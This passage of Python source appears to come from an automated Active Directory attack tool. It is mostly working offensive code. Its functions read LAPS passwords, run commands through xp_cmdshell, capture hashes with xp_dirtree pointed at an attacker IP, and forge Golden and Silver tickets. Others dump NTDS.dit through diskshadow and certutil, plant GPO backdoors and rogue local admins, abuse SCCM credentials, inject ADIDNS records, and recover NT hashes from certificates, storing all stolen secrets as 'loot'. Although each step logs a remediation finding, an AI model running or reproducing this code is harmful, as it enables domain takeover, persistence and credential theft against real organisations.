    # lsassy-style: domain\user:hash
    for m in re.finditer(r'([^\\:\s]+\\[^:\s]+):([a-f0-9]{32})', text, re.I):
        user, nth = m.group(1).replace("\\", "_"), m.group(2)
        SESSION.setdefault("loot", {})[user] = nth


def tool_laps_read(dc_ip: str, domain: str, username: str,
                    password: str = "", nt_hash: str = "",
                    target_computer: str = "") -> str:
    """Read LAPS (Local Administrator Password Solution) passwords from Active Directory.
    Requires ReadLAPSPassword permission on the computer object."""
    password = _real_secret(password)
    nt_hash  = _real_nt_hash(nt_hash)
    auth     = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    krb      = _session_kerberos_usable(username, domain)
    results  = []

    # NXC LAPS — use -M laps module (correct syntax for all nxc versions)
    target_opt = f"-o COMPUTER={shell_quote(target_computer)}" if target_computer else ""
    nxc_target = _dc_host_for_kerberos(domain, dc_ip) if _session_kerberos_usable(username, domain) else dc_ip
    laps_out = _nxc(f"ldap {nxc_target} {auth} -M laps {target_opt}", timeout=30)
    results.append(f"=== LAPS via NXC ===\n{laps_out[:2000]}")

    # LDAPsearch fallback for LAPS v1 (ms-Mcs-AdmPwd) and LAPS v2 (msLAPS-Password)
    base_dn = "DC=" + domain.replace(".", ",DC=")
    for attr in ("ms-Mcs-AdmPwd", "msLAPS-Password", "msLAPS-EncryptedPassword"):
        filt = f"(&(objectClass=computer)({attr}=*))"
        ldap_cmd = (f"ldapsearch -x -H ldap://{dc_ip} "
                    f"-D '{username}@{domain}' -w '{password}' "
                    f"-b '{base_dn}' '{filt}' sAMAccountName {attr} 2>/dev/null | "
                    f"grep -E 'sAMAccountName|{attr}'")
        if krb:
            ccache = SESSION.get("krb5_ccache", "")
            ldap_cmd = (f"KRB5CCNAME={shell_quote(ccache)} "
                        f"ldapsearch -Y GSSAPI -H ldap://{_dc_host_for_kerberos(domain, dc_ip)} "
                        f"-b '{base_dn}' '{filt}' sAMAccountName {attr} 2>/dev/null | "
                        f"grep -E 'sAMAccountName|{attr}'")
        out = _run(ldap_cmd, timeout=15)
        if out.strip():
            results.append(f"=== {attr} ===\n{out[:800]}")

    combined = "\n".join(results)
    if any(s in combined for s in ("ms-Mcs-AdmPwd:", "msLAPS-Password:", "Password:", "Pwn3d!")):
        add_finding("LAPS Password Readable", "Critical",
                    f"LAPS local admin password readable by {username}",
                    "Restrict ReadLAPSPassword ACL; use LAPS v2 with encryption")
        # Extract passwords for loot
        for m in re.finditer(r'(?:ms-Mcs-AdmPwd|msLAPS-Password|Password):\s*(.+)', combined, re.I):
            SESSION.setdefault("loot", {})[f"laps_{target_computer or 'unknown'}"] = m.group(1).strip()
    return combined[:4000]


def tool_mssql_abuse(dc_ip: str, domain: str, username: str,
                      password: str = "", nt_hash: str = "",
                      target_ip: str = "", command: str = "whoami") -> str:
    """MSSQL abuse: enumerate instances, check SA/xp_cmdshell, linked servers,
    UNC path hash capture, NTLM relay. Wraps PowerUpSQL + nxc mssql."""
    host     = str(target_ip or dc_ip).strip()
    password = _real_secret(password)
    nt_hash  = _real_nt_hash(nt_hash)
    auth     = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    results  = []

    # Discover MSSQL instances via NXC
    disc_out = _nxc(f"mssql {host} {auth}", timeout=20)
    results.append(f"=== MSSQL Discovery ===\n{disc_out[:600]}")

    if "STATUS_ACCESS_DENIED" in disc_out and not nt_hash and not password:
        return "\n".join(results) + "\nMSSQL: Authentication failed — provide valid credentials"

    # xp_cmdshell execution
    cmd_out = _nxc(f"mssql {host} {auth} -q \"EXEC xp_cmdshell '{command}'\" 2>&1", timeout=30)
    results.append(f"=== xp_cmdshell: {command} ===\n{cmd_out[:800]}")

    if "Error" in cmd_out and "xp_cmdshell" in cmd_out:
        # Try enabling xp_cmdshell first
        enable_out = _nxc(
            f"mssql {host} {auth} -q "
            "\"EXEC sp_configure 'show advanced options',1; RECONFIGURE; "
            "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE\" 2>&1",
            timeout=20
        )
        results.append(f"=== Enable xp_cmdshell ===\n{enable_out[:400]}")
        cmd_out2 = _nxc(f"mssql {host} {auth} -q \"EXEC xp_cmdshell '{command}'\"", timeout=20)
        results.append(f"=== xp_cmdshell retry ===\n{cmd_out2[:600]}")

    # Hash capture via xp_dirtree
    attacker_ip = SESSION.get("attacker_ip", "")
    if attacker_ip:
        hash_capture = _nxc(
            f"mssql {host} {auth} -q "
            f"\"EXEC xp_dirtree '\\\\\\\\{attacker_ip}\\\\share'\" 2>&1",
            timeout=15
        )
        results.append(f"=== Hash capture via xp_dirtree ===\n{hash_capture[:400]}")

    # Linked server enumeration
    linked_out = _nxc(
        f"mssql {host} {auth} -q "
        "\"SELECT name FROM sys.servers WHERE is_linked=1\" 2>&1",
        timeout=15
    )
    results.append(f"=== Linked servers ===\n{linked_out[:400]}")

    if any(s in "\n".join(results) for s in ("xp_cmdshell", "whoami", "nt authority\\system")):
        add_finding("MSSQL Code Execution", "Critical",
                    f"xp_cmdshell execution possible on {host}",
                    "Disable xp_cmdshell; restrict SA access; audit MSSQL logins")
    return "\n\n".join(results)[:5000]


def tool_golden_ticket(dc_ip: str, domain: str, username: str = "Administrator",
                        krbtgt_hash: str = "", domain_sid: str = "") -> str:
    """Forge a Golden Ticket using the krbtgt NT hash (from DCSync).
    Creates a TGT valid for any user — ultimate persistence."""
    krbtgt_hash = _real_nt_hash(krbtgt_hash) or _real_nt_hash(SESSION.get("loot", {}).get("krbtgt", ""))
    domain_sid  = domain_sid or SESSION.get("agent_intel", {}).get("domain_sid", "")
    results     = []

    if not krbtgt_hash:
        return ("Golden Ticket requires krbtgt NT hash. Run dcsync_attack first:\n"
                f"  secretsdump.py {domain}/administrator@{dc_ip} -just-dc-user krbtgt")

    # Get domain SID if not provided
    if not domain_sid:
        sid_out = _run(
            f"ldapsearch -x -H ldap://{dc_ip} "
            f"-D '{username}@{domain}' "
            f"-b 'DC={domain.replace('.', ',DC=')}' "
            f"'(objectClass=domain)' objectSid 2>/dev/null | grep objectSid",
            timeout=10
        )
        m = re.search(r"objectSid:\s*(S-1-5-21-\d+-\d+-\d+)", sid_out, re.I)
        if m:
            domain_sid = m.group(1)
            SESSION.setdefault("agent_intel", {})["domain_sid"] = domain_sid

    if not domain_sid:
        results.append("Domain SID not found automatically — provide it manually:\n"
                       f"  lookupsid.py {domain}/administrator@{dc_ip} | grep 'Domain SID'")

    ticketer = _impacket_cmd("ticketer")
    fake_ts  = _dc_time()
    ft       = f'faketime "{fake_ts}" ' if fake_ts and shutil.which("faketime") else ""

    ccache_out = f"{username}.ccache"
    sid_flag   = f"-domain-sid {domain_sid}" if domain_sid else ""

    cmd = (f"{ft}{shell_quote(sys.executable)} {shell_quote(ticketer)} "
           f"-nthash {krbtgt_hash} -domain {domain} {sid_flag} "
           f"-domain-ip {dc_ip} {username} 2>&1")
    out = _run(cmd, timeout=20)
    results.append(f"=== Golden Ticket ===\n{out[:800]}")

    if Path(ccache_out).exists() or "Saving ticket" in out:
        SESSION["krb5_ccache"] = ccache_out
        SESSION["use_kerberos"] = True
        os.environ["KRB5CCNAME"] = ccache_out
        add_finding("Golden Ticket Forged", "Critical",
                    f"Golden Ticket for {username} created — unlimited domain persistence",
                    "Reset krbtgt password TWICE; monitor for anomalous TGT lifetimes")
        results.append(
            f"Golden Ticket saved: {ccache_out}\n"
            f"Use with: KRB5CCNAME={ccache_out} evil-winrm -i {_dc_host_for_kerberos(domain, dc_ip)} "
            f"-r {domain.upper()} -K {ccache_out}\n"
            f"Or: secretsdump.py -k -no-pass {domain}/Administrator@dc.{domain}"
        )
    return "\n\n".join(results)


def tool_silver_ticket(dc_ip: str, domain: str, username: str = "Administrator",
                        service: str = "cifs", target_computer: str = "",
                        service_hash: str = "", domain_sid: str = "") -> str:
    """Forge a Silver Ticket for a specific service using the service account NT hash.
    No KDC contact — completely offline. Useful for persistence on individual hosts."""
    target_computer = target_computer or _dc_host_for_kerberos(domain, dc_ip)
    service_hash    = _real_nt_hash(service_hash)
    domain_sid      = domain_sid or SESSION.get("agent_intel", {}).get("domain_sid", "")
    results         = []

    if not service_hash:
        return ("Silver Ticket requires the target service account NT hash.\n"
                f"  For machine account: dcsync_attack targeting {target_computer}$\n"
                f"  For service account: kerberoast or dcsync the SPN account")

    ticketer = _impacket_cmd("ticketer")
    fake_ts  = _dc_time()
    ft       = f'faketime "{fake_ts}" ' if fake_ts and shutil.which("faketime") else ""
    host_short = target_computer.split(".")[0]

    cmd = (f"{ft}{shell_quote(sys.executable)} {shell_quote(ticketer)} "
           f"-nthash {service_hash} -domain {domain} "
           f"-domain-sid {domain_sid} -spn {service}/{target_computer} "
           f"-domain-ip {dc_ip} {username} 2>&1")
    out = _run(cmd, timeout=20)
    results.append(f"=== Silver Ticket ({service}/{target_computer}) ===\n{out[:600]}")

    ccache_out = f"{username}.ccache"
    if Path(ccache_out).exists() or "Saving ticket" in out:
        SESSION["krb5_ccache"] = ccache_out
        os.environ["KRB5CCNAME"] = ccache_out
        add_finding("Silver Ticket Forged", "High",
                    f"Silver Ticket for {service}/{target_computer} — persistent service access",
                    "Rotate service account passwords; enable PAC validation; monitor 4769 events")
        results.append(
            f"Silver Ticket: {ccache_out}\n"
            f"Use: KRB5CCNAME={ccache_out} smbclient //{target_computer}/C$ -k -N"
        )
    return "\n\n".join(results)


def tool_trust_attack(dc_ip: str, domain: str, username: str,
                       password: str = "", nt_hash: str = "",
                       attack: str = "enumerate") -> str:
    """Cross-domain / cross-forest trust attacks.
    attack: enumerate | child_to_parent | extraSID | cross_forest_kerberoast"""
    password = _real_secret(password)
    nt_hash  = _real_nt_hash(nt_hash)
    results  = []
    base_dn  = "DC=" + domain.replace(".", ",DC=")
    krb      = _session_kerberos_usable(username, domain)
    ccache   = SESSION.get("krb5_ccache", "")

    # Enumerate trusts first
    auth_flag = (f"-Y GSSAPI -H ldap://{_dc_host_for_kerberos(domain, dc_ip)}"
                 if krb else
                 f"-x -H ldap://{dc_ip} -D '{username}@{domain}' -w '{password}'")
    trust_out = _run(
        f"{'KRB5CCNAME=' + shell_quote(ccache) + ' ' if krb else ''}"
        f"ldapsearch {auth_flag} -b '{base_dn}' "
        f"'(objectClass=trustedDomain)' "
        f"trustPartner trustDirection trustType flatName 2>/dev/null",
        timeout=20
    )
    results.append(f"=== Domain Trusts ===\n{trust_out[:1000]}")

    trusts = re.findall(r"trustPartner:\s*(\S+)", trust_out, re.I)
    if trusts:
        SESSION.setdefault("agent_intel", {})["trusted_domains"] = trusts
        add_finding("Domain Trusts Found", "High",
                    f"Trusts: {trusts} — potential cross-domain escalation paths",
                    "Audit trust relationships; apply SID filtering; review trust direction")

    if attack == "child_to_parent" or attack == "enumerate":
        results.append(
            "=== Child → Parent Escalation ===\n"
            "If this domain is a child domain with bidirectional trust to parent:\n"
            "1. Get krbtgt hash of child domain (dcsync_attack)\n"
            "2. Get Enterprise Admin SID from parent forest root\n"
            "3. Forge inter-realm TGT with /extra-sid=<EA SID>\n\n"
            f"  lookupsid.py {domain}/{username}:{password or 'hash'}@{dc_ip} | grep 'Enterprise'\n"
            f"  ticketer.py -nthash <child_krbtgt_hash> -domain {domain} "
            f"-domain-sid <child_SID> -extra-sid <parent_EA_SID> -spn krbtgt/<parent_domain> Administrator"
        )

    if attack == "cross_forest_kerberoast":
        # Cross-forest Kerberoasting
        for trust_domain in trusts[:3]:
            trust_spn_out = _run(
                f"{_impacket_cmd('GetUserSPNs')} "
                f"{trust_domain}/{username}:{password or ''} "
                f"-dc-ip {dc_ip} -request 2>&1 | head -30",
                timeout=30
            )
            results.append(f"=== Cross-forest Kerberoast ({trust_domain}) ===\n{trust_spn_out[:500]}")

    return "\n\n".join(results)[:5000]


def tool_user_hunt(dc_ip: str, domain: str, username: str,
                    password: str = "", nt_hash: str = "",
                    target_user: str = "Administrator") -> str:
    """Hunt for active sessions and local admin access across domain machines.
    Finds where privileged users are logged on and where you can lateral move."""
    password = _real_secret(password)
    nt_hash  = _real_nt_hash(nt_hash)
    auth     = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    results  = []

    # Find all domain computers
    base_dn = "DC=" + domain.replace(".", ",DC=")
    computers_out = _run(
        f"ldapsearch -x -H ldap://{dc_ip} "
        f"-D '{username}@{domain}' -w '{password}' "
        f"-b '{base_dn}' '(objectClass=computer)' dNSHostName 2>/dev/null | "
        f"grep -i dNSHostName | awk '{{print $2}}'",
        timeout=15
    )
    computers = [l.strip() for l in computers_out.splitlines() if l.strip()][:50]

    if not computers:
        results.append("No computers found via LDAP — trying NXC sweep")
        subnet = _derive_scoped_subnet(dc_ip)
        # _derive_scoped_subnet returns e.g. "192.0.2.0" — add /24 once only
        subnet_cidr = subnet if "/" in subnet else f"{subnet}/24"
        sweep_out = _nxc(f"smb {subnet_cidr} {auth} --no-bruteforce 2>&1 | grep '\\[+\\]'", timeout=60)
        results.append(f"=== NXC Sweep ===\n{sweep_out[:800]}")
        # Try WinRM on non-DC hosts that responded with valid auth ([+])
        for m in re.finditer(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+\S+\s+\[\+\]', sweep_out):
            host_ip = m.group(1)
            if host_ip == dc_ip:
                continue
            winrm_test = _nxc(f"winrm {host_ip} {auth}", timeout=15)
            if "Pwn3d" in winrm_test:
                wt = SESSION.setdefault("agent_intel", {}).setdefault("winrm_targets", [])
                if host_ip not in wt:
                    wt.append(host_ip)
                add_finding(
                    "WinRM Access Found", "High",
                    f"WinRM shell access: {domain}\\{username} on {host_ip}",
                    "Restrict WinRM access; implement Just Enough Administration (JEA)"
                )
                results.append(f"WinRM Pwn3d! on {host_ip}")
            elif "[+]" in winrm_test or "[-]" not in winrm_test:
                results.append(f"SMB valid on {host_ip} — WinRM not available")
    else:
        results.append(f"Found {len(computers)} domain computers")

    # Check local admin access (Find-LocalAdminAccess equivalent)
    admin_targets = " ".join(computers[:20]) if computers else f"{dc_ip}/24"
    admin_out = _nxc(f"smb {admin_targets or dc_ip} {auth} 2>&1 | grep 'Pwn3d!'", timeout=90)
    if admin_out.strip():
        results.append(f"=== LOCAL ADMIN ACCESS ===\n{admin_out[:1000]}")
        for m in re.finditer(r"SMB\s+(\S+)\s+\d+", admin_out):
            host = m.group(1)
            SESSION.setdefault("agent_intel", {}).setdefault("winrm_targets", [])
            if host not in SESSION["agent_intel"]["winrm_targets"]:
                SESSION["agent_intel"]["winrm_targets"].append(host)
        add_finding("Local Admin Access Found", "Critical",
                    f"Local admin access on: {admin_out[:200]}",
                    "Implement LAPS; restrict local admin rights; audit group policy")

    # Check logged-on sessions (who is where)
    loggedon_out = _nxc(f"smb {dc_ip} {auth} --loggedon-users 2>&1", timeout=30)
    results.append(f"=== Logged-on users (DC) ===\n{loggedon_out[:600]}")

    # Hunt specific target user
    if target_user and target_user.lower() not in ("administrator", ""):
        results.append(f"Hunting for {target_user} sessions across domain...")
        for comp in computers[:15]:
            sess_out = _nxc(f"smb {comp} {auth} --loggedon-users 2>&1 | grep -i '{target_user}'", timeout=10)
            if sess_out.strip():
                results.append(f"  {target_user} found on {comp}:\n{sess_out[:300]}")

    return "\n\n".join(results)[:5000]


def tool_shadow_copies_dump(dc_ip: str, domain: str, username: str,
                              password: str = "", nt_hash: str = "") -> str:
    """Dump NTDS.dit via Volume Shadow Copies (VSS) / diskshadow.
    Alternative to DCSync — useful when DCSync is blocked."""
    password = _real_secret(password)
    nt_hash  = _real_nt_hash(nt_hash)
    auth     = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    dc_fqdn  = _dc_host_for_kerberos(domain, dc_ip)
    results  = []

    # List existing VSS
    vss_list = _nxc(f"smb {dc_ip} {auth} -x 'vssadmin list shadows'", timeout=30)
    results.append(f"=== VSS List ===\n{vss_list[:600]}")

    # Diskshadow script method
    ds_script = (
        "set verbose on\n"
        "set metadata C:\\Windows\\Temp\\meta.cab\n"
        "set context clientaccessible\n"
        "set context persistent\n"
        "begin backup\n"
        "add volume C: alias ntds\n"
        "create\n"
        "expose %ntds% Z:\n"
        "end backup\n"
    )
    ds_b64 = __import__("base64").b64encode(ds_script.encode("utf-16-le")).decode()
    commands = [
        f"echo {ds_b64} | certutil -decode C:\\Windows\\Temp\\ds.txt",
        "diskshadow /s C:\\Windows\\Temp\\ds.txt",
        "robocopy Z:\\Windows\\NTDS\\ C:\\Windows\\Temp\\ NTDS.dit /b",
        "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM /y",
        "reg save HKLM\\SAM C:\\Windows\\Temp\\SAM /y",
    ]
    results.append("=== VSS / Diskshadow NTDS extraction ===")
    for cmd in commands:
        out = _nxc(f"smb {dc_ip} {auth} -x {shell_quote(cmd)}", timeout=40)
        results.append(f"  [{cmd[:60]}]\n  {out.strip()[:200]}")

    # Impacket secretsdump against VSS copy
    secretsdump = _impacket_cmd("secretsdump")
    if nt_hash:
        sd_auth = f"{domain}/{username}@{dc_ip} -hashes :{nt_hash.split(':')[-1]}"
    elif password:
        sd_auth = f"{domain}/{username}:{password}@{dc_ip}"
    else:
        sd_auth = ""
    if sd_auth:
        sd_out = _run(
            f"{secretsdump} {sd_auth} "
            f"-ntds C:\\\\Windows\\\\Temp\\\\NTDS.dit "
            f"-system C:\\\\Windows\\\\Temp\\\\SYSTEM "
            f"-outputfile /tmp/agent_ntds 2>&1",
            timeout=120
        )
        results.append(f"=== secretsdump NTDS ===\n{sd_out[:2000]}")
        _extract_creds_into_session(sd_out)

    return "\n\n".join(results)[:6000]


def tool_gpo_abuse(dc_ip: str, domain: str, username: str,
                    password: str = "", nt_hash: str = "",
                    action: str = "enumerate", command: str = "") -> str:
    """GPO abuse: enumerate GPO permissions, create malicious GPO with immediate
    scheduled task, add local admin, startup script.
    action: enumerate | create_task | add_local_admin | list_linked"""
    password = _real_secret(password)
    nt_hash  = _real_nt_hash(nt_hash)
    auth     = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    base_dn  = "DC=" + domain.replace(".", ",DC=")
    krb      = _session_kerberos_usable(username, domain)
    ccache   = SESSION.get("krb5_ccache", "")
    results  = []

    # Enumerate GPO permissions (find writable GPOs)
    if action in ("enumerate", "list_linked"):
        auth_flag = (
            f"KRB5CCNAME={shell_quote(ccache)} ldapsearch -Y GSSAPI "
            f"-H ldap://{_dc_host_for_kerberos(domain, dc_ip)}"
            if krb else
            f"ldapsearch -x -H ldap://{dc_ip} -D '{username}@{domain}' -w '{password}'"
        )
        gpo_out = _run(
            f"{auth_flag} -b '{base_dn}' "
            f"'(objectClass=groupPolicyContainer)' displayName gPCFileSysPath nTSecurityDescriptor 2>/dev/null | "
            f"grep -E 'displayName|gPCFileSysPath'",
            timeout=15
        )
        results.append(f"=== GPO Enumeration ===\n{gpo_out[:1200]}")

    if action == "create_task":
        cmd_b64 = __import__("base64").b64encode(
            (command or "cmd.exe /c net localgroup Administrators evil /add").encode("utf-16-le")
        ).decode()
        results.append(
            "=== GPO Immediate Scheduled Task (SharpGPOAbuse) ===\n"
            "SharpGPOAbuse.exe --AddComputerTask --TaskName 'AdStrike' "
            f"--Author {domain}\\Administrator "
            f"--Command 'cmd.exe' --Arguments '/c powershell -enc {cmd_b64}' "
            "--GPOName 'Default Domain Policy'\n\n"
            "Alternative (PowerShell, if AMSI bypassed):\n"
            f"New-GPO -Name 'Evil' | New-GPLink -Target '{base_dn}'\n"
            f"Set-GPPrefRegistryValue -Name 'Evil' -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
            "-ValueName 'Backdoor' -Type String -Value 'cmd.exe /c <command>' -Action Create"
        )

    if action == "add_local_admin":
        results.append(
            "=== GPO Add Local Admin ===\n"
            "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount 'evil' "
            "--GPOName 'Default Domain Policy'\n\n"
            "Alternative via net rpc (if writable GPO found):\n"
            f"smbclient //{dc_ip}/SYSVOL -k -N -c 'cd {domain}/Policies; ls'"
        )

    return "\n\n".join(results)[:4000]


def tool_sccm_abuse(dc_ip: str, domain: str, username: str,
                     password: str = "", nt_hash: str = "") -> str:
    """SCCM (MECM) abuse: find SCCM servers, extract NAA credentials,
    enumerate collections, attempt site takeover."""
    password = _real_secret(password)
    nt_hash  = _real_nt_hash(nt_hash)
    auth     = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    dc_fqdn  = _dc_host_for_kerberos(domain, dc_ip)
    base_dn  = "DC=" + domain.replace(".", ",DC=")
    krb      = _session_kerberos_usable(username, domain)
    ccache   = SESSION.get("krb5_ccache", "")
    results  = []

    # ── 1. LDAP discovery — find SCCM management point ───────────────────────
    # SCCM registers itself under CN=System Management in AD
    if krb and ccache:
        ldap_cmd = (
            f"KRB5CCNAME={shell_quote(ccache)} "
            f"ldapsearch -Y GSSAPI -H ldap://{dc_fqdn} "
            f"-b 'CN=System Management,CN=System,{base_dn}' "
            f"'(objectClass=*)' cn dNSHostName mSSMSSiteCode 2>/dev/null | "
            f"grep -E 'cn:|dNSHostName|mSSMSSiteCode'"
        )
    elif password:
        ldap_cmd = (
            f"ldapsearch -x -H ldap://{dc_ip} "
            f"-D '{username}@{domain}' -w '{password}' "
            f"-b 'CN=System Management,CN=System,{base_dn}' "
            f"'(objectClass=*)' cn dNSHostName mSSMSSiteCode 2>/dev/null | "
            f"grep -E 'cn:|dNSHostName|mSSMSSiteCode'"
        )
    else:
        ldap_cmd = ""

    sccm_out = _run(ldap_cmd, timeout=15) if ldap_cmd else ""
    results.append(f"=== SCCM Site Discovery (LDAP) ===\n{sccm_out[:600] or '(no result — CN=System Management not found or access denied)'}")

    # Extract SCCM server from LDAP output
    sccm_server = dc_ip  # fallback to DC if no dedicated MP found
    m_fqdn = re.search(r"dNSHostName:\s*(\S+)", sccm_out, re.I)
    if m_fqdn:
        sccm_server = m_fqdn.group(1).strip()

    # ── 2. NXC — correct protocol is LDAP not SMB for SCCM module ────────────
    # nxc ldap can enumerate SCCM-related AD objects
    # Check if SCCM/MECM objects exist in AD via LDAP
    sccm_ldap = _nxc(f"ldap {dc_fqdn if krb else dc_ip} {auth} 2>&1 | head -5", timeout=15)
    # Try nxc smb sccm module (works on smb protocol, not ldap)
    sccm_smb = _nxc(f"smb {dc_ip} {auth} -M sccm 2>&1 | head -20", timeout=20)
    results.append(f"=== NXC SMB SCCM Module ===\n{sccm_smb[:400]}")

    # ── 3. sccmhunter — best dedicated SCCM tool ─────────────────────────────
    sccm_found = bool(sccm_out.strip() and "mSSMSSiteCode" in sccm_out)
    if shutil.which("sccmhunter"):
        auth_flag = f"-u '{username}' -p '{password}'" if password else f"-u '{username}'"
        if nt_hash:
            auth_flag = f"-u '{username}' -hashes ':{nt_hash.split(':')[-1]}'"
        hunt_out = _run(
            f"sccmhunter find -dc-ip {dc_ip} -d {domain} "
            f"{auth_flag} 2>&1 | head -40",
            timeout=30
        )
        results.append(f"=== sccmhunter find ===\n{hunt_out[:800]}")
        if "management point" in hunt_out.lower() or "site" in hunt_out.lower():
            sccm_found = True
    else:
        results.append("sccmhunter not installed — install: pip install sccmhunter")

    # ── 4. Exploitation guide with real values ────────────────────────────────
    pw_or_hash = f"-p '{password}'" if password else (f"-hashes ':{nt_hash.split(':')[-1]}'" if nt_hash else "-p '<password>'")
    results.append(
        f"=== SCCM Exploitation Guide ===\n"
        f"Target DC: {dc_ip}  |  Domain: {domain}  |  MP/DP: {sccm_server}\n\n"
        f"1. NAA credential extraction (no admin needed if HTTP policy accessible):\n"
        f"   sccmhunter http -dc-ip {dc_ip} -d {domain} -u '{username}' {pw_or_hash} -dp {sccm_server}\n\n"
        f"2. Client push attack (requires local admin on any domain machine):\n"
        f"   sccmhunter smb -dc-ip {dc_ip} -d {domain} -u '{username}' {pw_or_hash}\n\n"
        f"3. Site takeover via MSSQL relay (if MSSQL on SCCM server):\n"
        f"   sudo ntlmrelayx.py -t mssql://{sccm_server} --sccm --sccm-dp {sccm_server}\n\n"
        f"4. AdminService takeover (SCCM REST API — needs admin or specific role):\n"
        f"   sccmhunter admin -dc-ip {dc_ip} -d {domain} -u '{username}' {pw_or_hash} -mp {sccm_server}\n\n"
        f"5. Manual NAA check (WMI, requires local admin on SCCM client):\n"
        f"   nxc smb {sccm_server} -u '{username}' {pw_or_hash.replace('hashes', 'H')} "
        f"-M sccm"
    )

    combined = "\n".join(results)
    if sccm_found or any(s in combined.lower() for s in ("mssmssite", "sitecode", "management point")):
        add_finding("SCCM Infrastructure Found", "High",
                    f"SCCM/MECM deployment on {sccm_server} — check NAA credentials and client push abuse",
                    "Remove NAA accounts; use PKI for SCCM; restrict AdminService; audit SCCM admins")
    return combined[:5000]


def tool_adidns_abuse(dc_ip: str, domain: str, username: str,
                       password: str = "", nt_hash: str = "",
                       action: str = "enumerate",
                       record_name: str = "*", record_ip: str = "") -> str:
    """ADIDNS abuse: enumerate zones/records, inject wildcard for WPAD/LLMNR,
    add records for hash capture.
    action: enumerate | add_wildcard | add_record | remove_record"""
    password   = _real_secret(password)
    nt_hash    = _real_nt_hash(nt_hash)
    record_ip  = record_ip or SESSION.get("attacker_ip", "")
    results    = []

    dnstool_paths = [
        os.path.expanduser("~/.local/bin/dnstool.py"),
        str(Path(__file__).parent.parent.parent / "tools" / "krbrelayx" / "dnstool.py"),
        "/opt/krbrelayx/dnstool.py",
    ]
    dnstool = next((p for p in dnstool_paths if Path(p).exists()), "")

    if action == "enumerate":
        # List all DNS zones and records
        dns_base = "CN=MicrosoftDNS,DC=DomainDnsZones,DC=" + domain.replace(".", ",DC=")
        zones_out = _run(
            f"ldapsearch -x -H ldap://{dc_ip} "
            f"-D '{username}@{domain}' -w '{password}' "
            f"-b '{dns_base}' "
            f"'(objectClass=dnsZone)' name 2>/dev/null | grep name:",
            timeout=15
        )
        results.append(f"=== DNS Zones ===\n{zones_out[:600]}")

    if action in ("add_wildcard", "add_record") and dnstool and record_ip:
        auth_flag = f"-u '{domain}\\{username}' -p '{password}'"
        if nt_hash:
            auth_flag = f"-u '{domain}\\{username}' --hashes :{nt_hash.split(':')[-1]}"
        rec = record_name if action == "add_record" else "*"
        add_out = _run(
            f"{shell_quote(sys.executable)} {shell_quote(dnstool)} "
            f"-dc-ip {dc_ip} {auth_flag} --action add "
            f"--record {rec} --data {record_ip} --type A {domain} 2>&1",
            timeout=20
        )
        results.append(f"=== DNS Record Add ({rec} → {record_ip}) ===\n{add_out[:400]}")
        if "success" in add_out.lower() or "added" in add_out.lower():
            add_finding("ADIDNS Record Injected", "High",
                        f"DNS record {rec} → {record_ip} added — position for hash capture or WPAD",
                        "Disable ADIDNS user write access; use DNSSEC; block WPAD")

    if not dnstool:
        results.append(
            "dnstool.py not found. Install:\n"
            "  git clone https://github.com/dirkjanm/krbrelayx\n"
            "  # or: pip install krbrelayx\n\n"
            f"Manual wildcard injection:\n"
            f"  python3 dnstool.py -dc-ip {dc_ip} -u '{domain}\\{username}' "
            f"-p <pass> --action add --record '*' --data {record_ip or '<attacker_ip>'} "
            f"--type A {domain}"
        )

    return "\n\n".join(results)[:4000]


def tool_pass_the_cert(dc_ip: str, domain: str, username: str,
                        pfx_file: str = "", pfx_pass: str = "",
                        target_user: str = "Administrator") -> str:
    """PassTheCert / UnPAC-the-Hash: authenticate with a certificate to get NT hash.
    Uses certipy auth (PKINIT) or passthecert.py (LDAP Schannel).
    Useful after shadow_credentials_attack or ADCS exploitation."""
    certipy_bin = shell_quote(_bin("certipy"))
    dc_fqdn     = _dc_host_for_kerberos(domain, dc_ip)
    results     = []

    # Find PFX if not provided
    if not pfx_file:
        # Check common locations
        for candidate in [f"{username}.pfx", f"{target_user}.pfx"]:
            if Path(candidate).exists():
                pfx_file = candidate
                break
        if not pfx_file:
            return (
                "PassTheCert requires a PFX certificate file.\n"
                "Obtain one via:\n"
                "  shadow_credentials_attack → generates <user>.pfx\n"
                "  adcs_scan → certipy req generates <user>.pfx\n"
                f"  certipy req -u {username}@{domain} -k -no-pass "
                f"-dc-ip {dc_ip} -target {dc_fqdn} -template User -ca <CA>"
            )

    # certipy auth — gets NT hash + ccache via PKINIT
    fake_ts  = _dc_time()
    ft       = f'faketime "{fake_ts}" ' if fake_ts and shutil.which("faketime") else ""
    # certipy auth uses -password for PFX password (not -pfx-pass)
    pass_flag = f"-password '{pfx_pass}'" if pfx_pass else ""
    auth_cmd = (f"echo y | {ft}{certipy_bin} auth -pfx '{pfx_file}' "
                f"-dc-ip {dc_ip} -domain {domain} "
                f"-username '{target_user}' {pass_flag} 2>&1")
    out = _run(auth_cmd, timeout=30)
    results.append(f"=== certipy auth (PKINIT) ===\n{out[:800]}")

    # Parse NT hash
    nt_m = re.search(r"NT hash:\s*([a-f0-9]{32})", out, re.I)
    new_ccache = f"{target_user}.ccache"
    if nt_m:
        nth = nt_m.group(1)
        SESSION.setdefault("loot", {})[target_user] = nth
        SESSION["nt_hash"] = nth
        add_finding("PassTheCert — NT Hash Recovered", "Critical",
                    f"NT hash for {target_user} obtained via PKINIT certificate auth",
                    "Remove shadow credentials; rotate user password; monitor PKINIT events 4768")
        results.append(f"NT hash: {nth}\nNext: evil_winrm with hash")
    if Path(new_ccache).exists():
        SESSION["krb5_ccache"] = new_ccache
        SESSION["use_kerberos"] = True
        os.environ["KRB5CCNAME"] = new_ccache
        results.append(f"ccache: {new_ccache}\nevil-winrm -i {dc_fqdn} -r {domain.upper()} -K {new_ccache}")

    # passthecert.py fallback (LDAP Schannel — no PKINIT needed)
    pstc = shutil.which("passthecert.py") or os.path.expanduser("~/.local/bin/passthecert.py")
    if Path(pstc).exists():
        pstc_out = _run(
            f"{shell_quote(sys.executable)} {shell_quote(pstc)} "
            f"-action whoami -dc-ip {dc_ip} -domain {domain} "
